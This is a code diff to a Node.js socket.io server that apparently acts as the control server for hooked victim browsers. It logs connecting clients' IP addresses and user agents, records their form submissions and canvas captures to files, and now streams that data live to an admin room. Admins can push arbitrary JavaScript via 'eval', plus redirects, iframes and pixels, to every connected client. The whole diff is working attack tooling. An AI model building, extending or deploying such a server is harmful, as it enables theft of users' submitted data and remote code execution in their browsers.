@@ -18,48 +18,75 @@ app.use(express.static('static'));
 
 io.on('connection', function (socket) {
 
-  // client
-  socket.on('client', function(data) {
-    socket.join('clients');
-    log('VERBOSE', 'log.txt', {
-      ip: socket.handshake.address,
-      useragent: socket.handshake.headers['user-agent'] });
-  });
+// client
+socket.on('client', function(data) {
+  socket.join('clients');
 
-  // submit
-  socket.on('submit', function(data) {
-    log('VERBOSE', 'log.txt', { submit: data });
-  });
+  var data = {
+    date: Date(),
+    ip: socket.handshake.address,
+    useragent: socket.handshake.headers['user-agent']
+  }
 
-  // canvas
-  socket.on('canvas', function(data) {
-    log('FILE', 'canvas.txt', { canvas: data });
-  });
+  log('VERBOSE', 'log.txt', data);
+// refresh adminpanel
+socket.to('admin').emit('logs', data);
+});
 
-  // admin
-  socket.on('admin', function(data) {
-    var clientsRoom = socket.nsp.adapter.rooms.clients || {};
-    socket.emit('admin', Object.keys(clientsRoom).length); // number of clients currently online
-  });
+// submit
+socket.on('submit', function(data) {
 
-  // eval
-  socket.on('eval', function(data) {
-    socket.to('clients').emit('eval', data);
-  });
+  var data = {
+    date: Date(),
+    ip: socket.handshake.address,
+    submit: data
+  }
+  delete data.submit.undefined;
 
-  // redirect
-  socket.on('redirect', function(data) {
-    socket.to('clients').emit('redirect', data);
-  });
+  log('VERBOSE', 'data.txt', data);
+// refresh adminpanel
+socket.to('admin').emit('submit', data);
+});
 
-  // pixel
-  socket.on('pixel', function(data) {
-    socket.to('clients').emit('pixel', data);
-  });
+// canvas
+socket.on('canvas', function(data) {
 
-  // iframe
-  socket.on('iframe', function(data) {
-    socket.to('clients').emit('iframe', data);
-  });
+  var data = {
+    date: Date(),
+    ip: socket.handshake.address,
+    canvas: data
+  }
+
+  log('FILE', 'canvas.txt', data);
+// refresh adminpanel
+socket.to('admin').emit('canvas', data);
+});
+
+// admin
+socket.on('admin', function(data) {
+  socket.join('admin');
+  var clientsRoom = socket.nsp.adapter.rooms.clients || {};
+socket.emit('admin', Object.keys(clientsRoom).length); // number of clients currently online
+});
+
+// eval
+socket.on('eval', function(data) {
+  socket.to('clients').emit('eval', data);
+});
+
+// redirect
+socket.on('redirect', function(data) {
+  socket.to('clients').emit('redirect', data);
+});
+
+// pixel
+socket.on('pixel', function(data) {
+  socket.to('clients').emit('pixel', data);
+});
+
+// iframe
+socket.on('iframe', function(data) {
+  socket.to('clients').emit('iframe', data);
+});
 
 });
